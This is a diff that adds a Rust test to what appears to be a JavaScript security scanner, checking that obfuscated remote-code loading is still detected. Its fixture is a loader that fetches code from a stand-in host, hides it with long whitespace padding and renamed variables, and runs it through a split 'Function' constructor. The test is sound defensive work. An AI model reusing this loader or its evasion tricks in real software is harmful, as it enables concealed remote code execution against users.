@@ -917,6 +917,30 @@ fn remote_response_reaches_mutated_dynamic_execution_sinks() {
 }
 
 #[test]
+fn remote_execution_survives_long_whitespace_and_variable_renaming() {
+    let root = temporary_directory("whitespace-variable-renaming");
+    let padding = " ".repeat(10_000);
+    let source = format!(
+        "async function boot() {{ const _0xa1 = await fetch('https://example.invalid/payload');{padding}const _0xb2 = await _0xa1.text(); global['Fun' + 'ction'](_0xb2)(); }} boot();"
+    );
+    fs::write(root.join("main.js"), source).unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| {
+                finding["id"] == "JS-REMOTE-CODE-EXECUTION" && finding["severity"] == "critical"
+            })
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn remote_response_reaches_mutated_process_execution_sinks() {
     let cases = [
         (
